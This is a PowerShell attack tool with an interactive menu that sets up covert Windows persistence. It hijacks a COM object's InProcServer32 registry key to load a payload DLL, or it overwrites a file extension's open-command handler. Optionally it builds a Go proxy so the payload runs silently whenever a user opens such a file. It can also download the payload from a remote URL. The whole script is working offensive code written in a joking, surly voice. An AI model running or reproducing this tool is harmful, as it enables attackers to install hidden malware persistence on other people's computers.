# ███╗   ███╗██████╗         █████╗ ███╗   ██╗ ██████╗ ██████╗ ██╗   ██╗    ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗████████╗       ███╗
# ████╗ ████║██╔══██╗       ██╔══██╗████╗  ██║██╔════╝ ██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║╚══██╔══╝    ██╗██╔╝
# ██╔████╔██║██████╔╝       ███████║██╔██╗ ██║██║  ███╗██████╔╝ ╚████╔╝     ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║   ██║       ╚═╝██║ 
# ██║╚██╔╝██║██╔══██╗       ██╔══██║██║╚██╗██║██║   ██║██╔══██╗  ╚██╔╝      ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║   ██║       ██╗██║ 
# ██║ ╚═╝ ██║██║  ██║██╗    ██║  ██║██║ ╚████║╚██████╔╝██║  ██║   ██║       ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║   ██║       ╚═╝███╗
# ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝    ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝   ╚═╝          ╚══

function Show-Menu 
{ 
     
     cls 
     Write-Host "I hope you got a good reason to bother me on my nap time..."     
     Write-Host "1: Generate persistence via COM Object hijack." 
     Write-Host "2: Generate persistence via Extension Handler hijack (It requires admin privileges)." 
     Write-Host "3: Exit." 
} 

function Get-Code
{	
	do
	{
	    cls
	    Write-Host "Insert the payload (dll for COM Object hijack, exe for Extension Handler method) that you want to be executed each time the persistence is triggered." 
	    Write-Host "1: Download it via HTTP." 
	    Write-Host "2: Insert local path."
	    $mode = Read-Host "Choose one! I dont have all day, you know!?" 
	} While (($mode -le 0) -or ($mode -ge 3))
	$path = ""
	if ($mode -eq 1){
		cls
		$dir = Read-Host "Where should I download it from? (eg: http://mydomain.com/mypayload.dll)."
		$path = Read-Host "Where should I store it? (local path)."
		Invoke-WebRequest $dir -OutFile $path
	}else{
		cls
		$path = Read-Host "Show me the path to your payload. Quick!"
	}
	return $path
}

function COM-Object
{	
	cls
	$guid = Read-Host "Insert GUID of the COM Object (e.g: 5A8C927F-C467-437D-9AC3-C874A100400F)."
	$code = Get-Code
	Write-Host "Alright, let's do some magic..."	
	$arch = Read-Host "Do you want to create the key below WOW6432Node registry (y) or directly under Classes (n)?"
	if ($arch -eq "n"){
		$Path1 = "HKCU:\Software\Classes\CLSID\{$guid}"
		$Path2 = "HKCU:\Software\Classes\CLSID\{$guid}\InProcServer32"
	}else{
		$Path1 = "HKCU:\Software\Classes\WOW6432Node\CLSID\{$guid}"
		$Path2 = "HKCU:\Software\Classes\WOW6432Node\CLSID\{$guid}\InProcServer32"
	}
	Try{
		New-Item -Path $Path1 
		New-Item -Path $Path2
	}Catch{
		Write-Host "The key value exists already. I'm gonna overwrite it!"
	}
	Set-Item -Path $Path2 -Value $code
	Write-Host "Hell yeah! Now you are persistent too!"
	$input = Read-Host "Now, press any key and leave me alone!"
}

function generateProxy($a,$b){
	
	$b = $b.replace("\","\\")
	$args = ""
	$exec = "cmd1 := exec.Command(real_app,"
	For($i=1; $i -lt $a; $i++){
		$next = $i + 1
		$args += "arg_$i := os.Args[$next]`n`r"
		$exec += "arg_$i" 
		if ($i -lt ($a - 1)){
			$exec += ","
		}else{
			$exec += ")"
		}
	}
	$code = "
	package main

	import(
		""os""
		""os/exec""
	)

	func main(){
		path := ""$b""
		cmd := exec.Command(path)
		cmd.Start()

		real_app := os.Args[1]
		$args
		$exec
		cmd1.Start()
	}
	"
	$code | Set-Content -Encoding utf8 C:\Users\Public\proxy.go

}

function parseValue( $value,[ref] $split, [ref] $n){
	
	cls
	Write-Host "This is the actual value of the registry that im gonna overwrite: $value"
	Write-Host "I dont want to parse this sh**, so you will have to do it for me."
	$num = Read-Host "Tell much, how many parameters of the actual registry value do you want to keep? Including executable path! (Usually, you should keep all the parameters)"
	$n.value = $num
	Write-Host "Ok, now insert the parameters in the same order in which they were (keep or add double quotes if they contain blank spaces or special characters like %):"
	For($i = 1; $i -le $num; $i ++){
		$arg = Read-Host "Insert argument number $i!"
		$split.value += $arg
		if ($i -lt $num){
			$split.value += " "
		}
	}

}

function Extension-Handler
{	
	cls
	$ext = Read-Host "Wich file extension do you want to 'poison'? Choose it, now!"
	cls
	Write-Host "In some environments, System privileges might be required. I hope you have it under control..."
	New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT
	Start-Sleep -Seconds 1
	$v = (get-itemproperty -literalpath HKCR:\.$ext).'(default)'
	$value = (get-itemproperty -literalpath HKCR:\$v\shell\open\command).'(default)'
	if(-not ([string]::IsNullOrEmpty($value))){
		do{
			$r = Read-Host "Do you want to use a proxy? This way, the files of the selected extension will be opened as usual and the payload will be executed without warning the user. (y/n)"
		}until(($r -eq "y") -or ($r -eq "n"))
		if($r -eq "y"){
			cls
			Write-Host "Really? You want me to work harder, huh? Ok, lets do this..."
			Write-Host "First of all...Where is the proxy file located?"
			Write-Host "1. Create new proxy."
			Write-Host "2. Insert proxy's executable path."
			$path = Read-Host "So...?"
			if ($path -eq 1){
				$code = Get-Code
				$n = 0
				$split = ""
				parseValue $value ([ref] $split) ([ref] $n)
				generateProxy $n $code
				$value = $split
				Try{
					cd C:\Users\Public
					go build C:\Users\Public\proxy.go
					$path = "C:\Users\Public\proxy.exe"
					del C:\Users\Public\proxy.go

				}Catch{

					Write-Host "Go is not installed on the system...WTF!?"
					Write-Host "Whatever...I created for you a proxy.go file located in C:\Windows\Temp\ folder. Dont come back to me until you have the exe ready!"
					$input = Read-Host "I leave now." 
					exit

				}
				
			}else{

				$path = Read-Host "Where is the proxy executable?"
				$split = ""
				parseValue $value ([ref] $split) ([ref] $notUsed)
				$value = $split
				
			}

			Write-Host "Alright, let's do some magic..."
			$f = "HKCR:\$v\shell\open\command"
			$fin = $path + " " + $value
			Set-Item -Path $f -Value $fin
			Write-Host "Hell yeah! Now you are persistent too!"
			$input = Read-Host "Now, press any key and leave me alone!"

		}else{
			Write-Host "Great, cause im too tired for your nonsense."
			Write-Host "Alright, let's do some magic..."
			$f = "HKCR:\$v\shell\open\command"
			Set-Item -Path $f -Value $code
			Write-Host "Hell yeah! Now you are persistent too!"
			$input = Read-Host "Now, press any key and leave me alone!"
		}

	}else{
		Write-Host "Dont waste my time, this extension doesnt even exist!"
	}
}

do 
{ 
     Show-Menu 
     $input = Read-Host "Choose. Fast!" 
     switch ($input) 
     { 
           '1' { 
                cls 
                Com-Object 
           } '2' { 
                cls 
                Extension-Handler
           } '3' { 
                return
           }
     } 
      
} 
until ($input -eq '3')
